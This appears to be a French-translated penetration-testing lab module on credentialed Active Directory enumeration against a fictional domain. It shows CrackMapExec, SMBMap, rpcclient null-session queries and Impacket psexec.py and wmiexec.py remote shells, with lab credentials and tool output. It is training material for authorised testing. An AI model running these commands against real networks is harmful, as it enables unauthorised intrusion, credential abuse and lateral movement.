Énumération accréditée - à partir de Linux
==========================================

* * * * *

Maintenant que nous avons pris pied dans le domaine, il est temps de creuser plus profondément en utilisant nos informations d'identification d'utilisateur de domaine à faible privilège. Puisque nous avons une idée générale de la base d'utilisateurs et des machines du domaine, il est temps d'énumérer le domaine en profondeur. Nous sommes intéressés par des informations sur les attributs d'utilisateur et d'ordinateur de domaine, l'appartenance à un groupe, les objets de stratégie de groupe, les autorisations, les ACL, les approbations, etc. Nous avons différentes options disponibles, mais la chose la plus importante à retenir est que la plupart de ces outils ne fonctionneront pas sans informations d'identification d'utilisateur de domaine valides à n'importe quel niveau d'autorisation. Donc, au minimum, nous devrons avoir acquis le mot de passe en texte clair d'un utilisateur, le hachage du mot de passe NTLM ou l'accès SYSTEM sur un hôte joint à un domaine.

Pour suivre, générez la cible au bas de cette section et SSH vers l'hôte d'attaque Linux en tant qu'utilisateur `htb-student`. Pour l'énumération du domaine INLANEFREIGHT.LOCAL à l'aide des outils installés sur l'hôte Parrot Linux ATTACK01, nous utiliserons les identifiants suivants : User= `forend`et password= `Klmcargo2`. Une fois notre accès établi, il est temps de se mettre au travail. Nous allons commencer par `CrackMapExec`.

* * * * *

CrackMapExec
------------

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (CME) est un ensemble d'outils puissants pour aider à évaluer les environnements AD. Il utilise des packages des kits d'outils Impacket et PowerSploit pour exécuter ses fonctions. Pour des explications détaillées sur l'utilisation de l'outil et des modules qui l'accompagnent, consultez le [wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki) . N'ayez pas peur d'utiliser le `-h`drapeau pour passer en revue les options et la syntaxe disponibles.

#### Menu d'aide CME

  Menu d'aide CME

```
dsgsec@htb[/htb]$ crackmapexec -h

usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell]
                    [--verbose]
                    {mssql,smb,ssh,winrm} ...

      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
     /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
    |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
    |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
    |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
     \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                                         A swiss army knife for pentesting networks
                                    Forged by @byt3bl33d3r using the powah of dank memes

                                                      Version: 5.0.2dev
                                                     Codename: P3l1as
optional arguments:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {mssql,smb,ssh,winrm}
    mssql               own stuff using MSSQL
    smb                 own stuff using SMB
    ssh                 own stuff using SSH
    winrm               own stuff using WINRM

Ya feelin' a bit buggy all of a sudden?

```

Nous pouvons voir que nous pouvons utiliser l'outil avec les informations d'identification MSSQL, SMB, SSH et WinRM. Regardons nos options pour CME avec le protocole SMB :

#### Options CME (PME)

  Options CME (PME)

```
dsgsec@htb[/htb]$ crackmapexec smb -h

usage: crackmapexec smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k]
                        [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST]
                        [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE]
                        [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {https,http}] [--server-host HOST]
                        [--server-port PORT] [-H HASH [HASH ...]] [--no-bruteforce] [-d DOMAIN | --local-auth] [--port {139,445}]
                        [--share SHARE] [--smb-server-port SMB_SERVER_PORT] [--gen-relay-list OUTPUT_FILE] [--continue-on-success]
                        [--sam | --lsa | --ntds [{drsuapi,vss}]] [--shares] [--sessions] [--disks] [--loggedon-users] [--users [USER]]
                        [--groups [GROUP]] [--local-groups [GROUP]] [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY]
                        [--wmi-namespace NAMESPACE] [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST]
                        [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--depth DEPTH] [--only-files]
                        [--put-file FILE FILE] [--get-file FILE FILE] [--exec-method {atexec,smbexec,wmiexec,mmcexec}] [--force-ps32]
                        [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE] [--clear-obfscripts]
                        [target ...]

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or
                        .Nessus file(s)

optional arguments:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  -k, --kerberos        Use Kerberos authentication from ccache file (KRB5CCNAME)

<SNIP>

```

CME propose un menu d'aide pour chaque protocole (par exemple, `crackmapexec winrm -h`, etc.). Assurez-vous de consulter l'intégralité du menu d'aide et toutes les options possibles. Pour l'instant, les drapeaux qui nous intéressent sont :

-   -u Nom d'utilisateur`The user whose credentials we will use to authenticate`
-   -p Mot de passe`User's password`
-   Cible (IP ou FQDN) `Target host to enumerate`(dans notre cas, le contrôleur de domaine)
-   --utilisateurs`Specifies to enumerate Domain Users`
-   --groupes`Specifies to enumerate domain groups`
-   --loggedon-users`Attempts to enumerate what users are logged on to a target, if any`

Nous allons commencer par utiliser le protocole SMB pour énumérer les utilisateurs et les groupes. Nous ciblerons le contrôleur de domaine (dont nous avons découvert l'adresse plus tôt) car il contient toutes les données de la base de données du domaine qui nous intéressent. Assurez-vous de faire précéder toutes les commandes de `sudo`.

#### CME - Énumération des utilisateurs de domaine

Nous commençons par pointer CME vers le contrôleur de domaine et en utilisant les informations d'identification de l' `forend`utilisateur pour récupérer une liste de tous les utilisateurs du domaine. Remarquez que lorsqu'il nous fournit les informations sur l'utilisateur, il inclut des points de données tels que l' attribut [badPwdCount](https://docs.microsoft.com/en-us/windows/win32/adschema/a-badpwdcount) . Ceci est utile lorsque vous effectuez des actions telles que la pulvérisation ciblée de mots de passe. Nous pourrions créer une liste d'utilisateurs cibles en filtrant tous les utilisateurs dont `badPwdCount`l'attribut est supérieur à 0 pour faire très attention à ne pas verrouiller de comptes.

  CME - Énumération des utilisateurs de domaine

```
dsgsec@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395

<SNIP>

```

Nous pouvons également obtenir une liste complète des groupes de domaines. Nous devrions enregistrer toutes nos sorties dans des fichiers pour y accéder facilement plus tard pour les rapports ou les utiliser avec d'autres outils.

#### CME - Énumération des groupes de domaines

  CME - Énumération des groupes de domaines

```
dsgsec@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0

<SNIP>

SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0

<SNIP>

SMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36

<SNIP>

```

L'extrait ci-dessus répertorie les groupes au sein du domaine et le nombre d'utilisateurs dans chacun. La sortie affiche également les groupes intégrés sur le contrôleur de domaine, tels que `Backup Operators`. Nous pouvons commencer à noter les groupes d'intérêt. Prenez note des groupes clés tels que `Administrators`, `Domain Admins`, `Executives`, tous les groupes pouvant contenir des administrateurs informatiques privilégiés, etc. Ces groupes contiendront probablement des utilisateurs avec des privilèges élevés à cibler lors de notre évaluation.

#### CME - Utilisateurs connectés

Nous pouvons également utiliser CME pour cibler d'autres hôtes. Examinons ce qui semble être un serveur de fichiers pour voir quels utilisateurs sont actuellement connectés.

  CME - Utilisateurs connectés

```
dsgsec@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01

<SNIP>

```

On voit que de nombreux utilisateurs sont connectés à ce serveur ce qui est très intéressant. Nous pouvons également voir que notre utilisateur `forend`est un administrateur local car `(Pwn3d!)`apparaît après que l'outil s'est authentifié avec succès auprès de l'hôte cible. Un hôte comme celui-ci peut être utilisé comme hôte de saut ou similaire par les utilisateurs administratifs. Nous pouvons voir que l'utilisateur `wley`est connecté, que nous avons précédemment identifié comme administrateur de domaine. Cela pourrait être une victoire facile si nous pouvions voler les informations d'identification de cet utilisateur dans la mémoire ou les usurper.

Comme nous le verrons plus tard, `BloodHound`(et d'autres outils tels que `PowerView`) peuvent être utilisés pour rechercher des sessions utilisateur. BloodHound est particulièrement puissant car nous pouvons l'utiliser pour visualiser graphiquement et rapidement les sessions des utilisateurs de domaine de plusieurs façons. Quoi qu'il en soit, des outils tels que CME sont parfaits pour une énumération et une recherche d'utilisateurs plus ciblées.

#### Recherche de partage CME

Nous pouvons utiliser l' `--shares`indicateur pour énumérer les partages disponibles sur l'hôte distant et le niveau d'accès de notre compte d'utilisateur à chaque partage (accès READ ou WRITE). Exécutons ceci sur le contrôleur de domaine INLANEFREIGHT.LOCAL.

#### Partage d'énumération - Contrôleur de domaine

  Partage d'énumération - Contrôleur de domaine

```
dsgsec@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark
SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin
SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ
SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC
SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share
SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share
SMB         172.16.5.5      445    ACADEMY-EA-DC01  User Shares     READ
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ZZZ_archive     READ

```

Nous voyons plusieurs actions à notre disposition avec `READ`accès. Les partages `Department Shares`, `User Shares`, et `ZZZ_archive`mériteraient d'être approfondis car ils peuvent contenir des données sensibles telles que des mots de passe ou des PII. Ensuite, nous pouvons creuser dans les partages et parcourir chaque répertoire à la recherche de fichiers. Le module `spider_plus`fouillera dans chaque partage lisible sur l'hôte et listera tous les fichiers lisibles. Essayons.

#### Araignée_plus

  Araignée_plus

```
dsgsec@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: ['print$']
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: ['ico', 'lnk']
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus

```

Dans la commande ci-dessus, nous avons exécuté l'araignée contre le `Department Shares`. Une fois terminé, CME écrit les résultats dans un fichier JSON situé à l'adresse `/tmp/cme_spider_plus/<ip of host>`. Ci-dessous, nous pouvons voir une partie de la sortie JSON. Nous pourrions rechercher des fichiers intéressants tels que `web.config`des fichiers ou des scripts pouvant contenir des mots de passe. Si nous voulions creuser plus loin, nous pourrions extraire ces fichiers pour voir ce qu'ils contiennent tous, peut-être trouver des informations d'identification codées en dur ou d'autres informations sensibles.

  Araignée_plus

```
dsgsec@htb[/htb]$ head -n 10 /tmp/cme_spider_plus/172.16.5.5.json

{
    "Department Shares": {
        "Accounting/Private/AddSelect.bat": {
            "atime_epoch": "2022-03-31 14:44:42",
            "ctime_epoch": "2022-03-31 14:44:39",
            "mtime_epoch": "2022-03-31 15:14:46",
            "size": "278 Bytes"
        },
        "Accounting/Private/ApproveConnect.wmf": {
            "atime_epoch": "2022-03-31 14:45:14",

<SNIP>

```

CME est puissant, et ce n'est qu'un petit aperçu de ses capacités ; cela vaut la peine de l'expérimenter davantage par rapport aux cibles du laboratoire. Nous utiliserons CME de diverses manières au fur et à mesure que nous progresserons dans le reste de ce module. Passons à autre chose et jetons un coup d'œil à [SMBMap](https://github.com/ShawnDEvans/smbmap) maintenant.

* * * * *

SMBMap
------

SMBMap est idéal pour énumérer les partages SMB à partir d'un hôte d'attaque Linux. Il peut être utilisé pour rassembler une liste de partages, d'autorisations et de contenus de partage s'ils sont accessibles. Une fois l'accès obtenu, il peut être utilisé pour télécharger et télécharger des fichiers et exécuter des commandes à distance.

Comme CME, nous pouvons utiliser SMBMap et un ensemble d'informations d'identification d'utilisateur de domaine pour vérifier les partages accessibles sur les systèmes distants. Comme avec d'autres outils, nous pouvons taper la commande `smbmap` `-h`pour afficher le menu d'utilisation de l'outil. En plus de répertorier les partages, nous pouvons utiliser SMBMap pour répertorier récursivement les répertoires, répertorier le contenu d'un répertoire, rechercher le contenu des fichiers, etc. Cela peut être particulièrement utile lorsque vous pillez des partages pour obtenir des informations utiles.

#### SMBMap pour vérifier l'accès

  SMBMap pour vérifier l'accès

```
dsgsec@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

[+] IP: 172.16.5.5:445	Name: inlanefreight.local
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	SYSVOL                                            	READ ONLY	Logon server share
	User Shares                                       	READ ONLY	
	ZZZ_archive                                       	READ ONLY

```

Ce qui précède nous indiquera à quoi notre utilisateur peut accéder et ses niveaux d'autorisation. Comme nos résultats de CME, nous voyons que l'utilisateur `forend`n'a pas accès au DC via les partages `ADMIN$`ou `C$`(ceci est attendu pour un compte d'utilisateur standard), mais a un accès en lecture sur `IPC$`, `NETLOGON`, et `SYSVOL`qui est la valeur par défaut dans n'importe quel domaine. Les autres partages non standard, tels que `Department Shares`les partages utilisateur et archive, sont les plus intéressants. Faisons une liste récursive des répertoires du `Department Shares`partage. Nous pouvons voir, comme prévu, des sous-répertoires pour chaque département de l'entreprise.

#### Liste récursive de tous les répertoires

  Liste récursive de tous les répertoires

```
dsgsec@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

[+] IP: 172.16.5.5:445	Name: inlanefreight.local
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Department Shares                                 	READ ONLY	
	.\Department Shares\*
	dr--r--r--                0 Thu Mar 31 15:34:29 2022	.
	dr--r--r--                0 Thu Mar 31 15:34:29 2022	..
	dr--r--r--                0 Thu Mar 31 15:14:48 2022	Accounting
	dr--r--r--                0 Thu Mar 31 15:14:39 2022	Executives
	dr--r--r--                0 Thu Mar 31 15:14:57 2022	Finance
	dr--r--r--                0 Thu Mar 31 15:15:04 2022	HR
	dr--r--r--                0 Thu Mar 31 15:15:21 2022	IT
	dr--r--r--                0 Thu Mar 31 15:15:29 2022	Legal
	dr--r--r--                0 Thu Mar 31 15:15:37 2022	Marketing
	dr--r--r--                0 Thu Mar 31 15:15:47 2022	Operations
	dr--r--r--                0 Thu Mar 31 15:15:58 2022	R&D
	dr--r--r--                0 Thu Mar 31 15:16:10 2022	Temp
	dr--r--r--                0 Thu Mar 31 15:16:18 2022	Warehouse

    <SNIP>

```

Au fur et à mesure que la liste récursive plonge plus profondément, elle vous montrera la sortie de tous les sous-répertoires dans les répertoires de niveau supérieur. L'utilisation de `--dir-only`fournissait uniquement la sortie de tous les répertoires et ne répertoriait pas tous les fichiers. Essayez ceci avec d'autres partages sur le contrôleur de domaine et voyez ce que vous pouvez trouver.

Maintenant que nous avons couvert les partages, regardons `RPCClient`.

* * * * *

rpcclient
---------

[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) est un outil pratique créé pour être utilisé avec le protocole Samba et pour fournir des fonctionnalités supplémentaires via MS-RPC. Il peut énumérer, ajouter, modifier et même supprimer des objets d'AD. Il est très polyvalent; nous devons juste trouver la bonne commande à émettre pour ce que nous voulons accomplir. La page de manuel de rpcclient est très utile pour cela ; tapez simplement `man rpcclient`dans le shell de votre hôte d'attaque et passez en revue les options disponibles. Passons en revue quelques fonctions rpcclient qui peuvent être utiles lors d'un test d'intrusion.

En raison des sessions SMB NULL (couvertes en profondeur dans les sections de pulvérisation de mots de passe) sur certains de nos hôtes, nous pouvons effectuer une énumération authentifiée ou non authentifiée à l'aide de rpcclient dans le domaine INLANEFREIGHT.LOCAL. Un exemple d'utilisation de rpcclient d'un point de vue non authentifié (si cette configuration existe dans notre domaine cible) serait :

Code : bash

```
rpcclient -U "" -N 172.16.5.5

```

Ce qui précède nous fournira une connexion liée, et nous devrions être accueillis avec une nouvelle invite pour commencer à libérer la puissance de rpcclient.

#### Session SMB NULL avec rpcclient

![image](https://academy.hackthebox.com/storage/modules/143/rpcclient.png)

À partir de là, nous pouvons commencer à énumérer un certain nombre de choses différentes. Commençons par les utilisateurs du domaine.

#### Énumération rpcclient

En regardant les utilisateurs dans rpcclient, vous remarquerez peut-être un champ appelé `rid:`à côté de chaque utilisateur. Un [identificateur relatif (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) est un identificateur unique (représenté au format hexadécimal) utilisé par Windows pour suivre et identifier des objets. Pour expliquer comment cela s'intègre, regardons les exemples ci-dessous :

-   Le [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) du domaine INLANEFREIGHT.LOCAL est : `S-1-5-21-3842939050-3880317879-2865463114`.
-   Lorsqu'un objet est créé dans un domaine, le numéro ci-dessus (SID) sera combiné avec un RID pour créer une valeur unique utilisée pour représenter l'objet.
-   Ainsi, l'utilisateur de domaine `htb-student`avec un RID:[0x457] Hex 0x457 serait = décimal `1111`, aura un SID utilisateur complet de : `S-1-5-21-3842939050-3880317879-2865463114-1111`.
-   Ceci est unique à l' `htb-student`objet dans le domaine INLANEFREIGHT.LOCAL et vous ne verrez jamais cette valeur jumelée liée à un autre objet dans ce domaine ou tout autre.

Cependant, vous remarquerez que certains comptes ont le même RID, quel que soit l'hôte sur lequel vous vous trouvez. Les comptes tels que l'administrateur intégré pour un domaine auront un RID [administrateur] rid:[0x1f4], qui, lorsqu'il est converti en une valeur décimale, est égal à `500`. Le compte administrateur intégré aura toujours la valeur RID `Hex 0x1f4`ou 500. Ce sera toujours le cas. Étant donné que cette valeur est unique à un objet, nous pouvons l'utiliser pour énumérer d'autres informations à son sujet à partir du domaine. Essayons à nouveau avec rpcclient. Nous allons creuser un peu en ciblant l' `htb-student`utilisateur.

#### Énumération des utilisateurs RPCClient par RID

  Énumération des utilisateurs RPCClient par RID

```
rpcclient $> queryuser 0x457

        User Name   :   htb-student
        Full Name   :   Htb Student
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT
        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x457
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000001d
        padding1[0..7]...
        logon_hrs[0..21]...

```

Lorsque nous avons recherché des informations à l'aide de la `queryuser`commande par rapport au RID `0x457`, RPC a renvoyé les informations utilisateur pour `htb-student`comme prévu. Ce n'était pas difficile puisque nous connaissions déjà le RID pour `htb-student`. Si nous souhaitions énumérer tous les utilisateurs pour rassembler les RID de plusieurs utilisateurs, nous utiliserions la `enumdomusers`commande.

#### Enumdomusers

  Enumdomusers

```
rpcclient $> enumdomusers

user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
user:[pfalcon] rid:[0x459]
user:[fanthony] rid:[0x45a]
user:[wdillard] rid:[0x45b]
user:[lbradford] rid:[0x45c]
user:[sgage] rid:[0x45d]
user:[asanchez] rid:[0x45e]
user:[dbranch] rid:[0x45f]
user:[ccruz] rid:[0x460]
user:[njohnson] rid:[0x461]
user:[mholliday] rid:[0x462]

<SNIP>

```

L'utiliser de cette manière imprimera tous les utilisateurs du domaine par nom et RID. Notre énumération peut entrer dans les moindres détails en utilisant rpcclient. Nous pourrions même commencer à effectuer des actions telles que modifier des utilisateurs et des groupes ou ajouter les nôtres dans le domaine, mais cela est hors de portée de ce module. Pour l'instant, nous voulons simplement effectuer une énumération de domaine pour valider nos résultats. Prenez le temps de jouer avec les autres fonctions rpcclient et voyez les résultats qu'elles produisent. Pour plus d'informations sur des sujets tels que les SID, les RID et d'autres composants de base d'AD, il serait intéressant de consulter le module [Introduction à Active Directory . ](https://academy.hackthebox.com/course/preview/introduction-to-active-directory)Maintenant, il est temps de plonger dans Impacket dans toute sa splendeur.

* * * * *

Boîte à outils Impacket
-----------------------

Impacket est une boîte à outils polyvalente qui nous offre de nombreuses façons différentes d'énumérer, d'interagir et d'exploiter les protocoles Windows et de trouver les informations dont nous avons besoin à l'aide de Python. L'outil est activement maintenu et compte de nombreux contributeurs, en particulier lorsque de nouvelles techniques d'attaque apparaissent. Nous pourrions effectuer de nombreuses autres actions avec Impacket, mais nous n'en soulignerons que quelques-unes dans cette section ; [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) et [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) . Plus tôt dans la section empoisonnement, nous avons saisi un hachage pour l'utilisateur `wley`avec `Responder`et l'avons craqué pour obtenir le mot de passe `transporter@4`. Nous verrons dans la section suivante que cet utilisateur est un administrateur local sur l' `ACADEMY-EA-FILE`hôte. Nous utiliserons les informations d'identification pour les prochaines actions.

#### Psexec.py

L'un des outils les plus utiles de la suite Impacket est `psexec.py`. Psexec.py est un clone de l'exécutable psexec de Sysinternals, mais fonctionne légèrement différemment de l'original. L'outil crée un service distant en téléchargeant un exécutable nommé de manière aléatoire sur le `ADMIN$`partage sur l'hôte cible. Il enregistre ensuite le service via `RPC`et le `Windows Service Control Manager`. Une fois établie, la communication s'effectue via un canal nommé, fournissant un shell distant interactif comme `SYSTEM`sur l'hôte victime.

#### Utilisation de psexec.py

Pour se connecter à un hôte avec psexec.py, nous avons besoin des informations d'identification d'un utilisateur disposant de privilèges d'administrateur local.

Code : bash

```
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125

```

![image](https://academy.hackthebox.com/storage/modules/143/psexec-action.png)

Une fois que nous avons exécuté le module psexec, il nous dépose dans le `system32`répertoire de l'hôte cible. Nous avons exécuté la `whoami`commande pour vérifier, et cela a confirmé que nous avons atterri sur l'hôte en tant que `SYSTEM`. À partir de là, nous pouvons effectuer la plupart des tâches sur cet hôte ; n'importe quoi, d'une énumération supplémentaire à la persévérance et au mouvement latéral. Essayons un autre module Impacket : `wmiexec.py`.

#### wmiexec.py

Wmiexec.py utilise un shell semi-interactif où les commandes sont exécutées via [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) . Il ne dépose aucun fichier ou exécutable sur l'hôte cible et génère moins de journaux que les autres modules. Après la connexion, il s'exécute en tant qu'utilisateur administrateur local avec lequel nous nous sommes connectés (cela peut être moins évident pour quelqu'un qui recherche une intrusion que de voir SYSTEM exécuter de nombreuses commandes). Il s'agit d'une approche plus furtive de l'exécution sur les hôtes que d'autres outils, mais elle serait probablement interceptée par la plupart des systèmes antivirus et EDR modernes. Nous utiliserons le même compte qu'avec psexec.py pour accéder à l'hôte.

#### Utilisation de wmiexec.py

Code : bash

```
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5

```

![texte](https://academy.hackthebox.com/storage/modules/143/wmiexec-action.png)

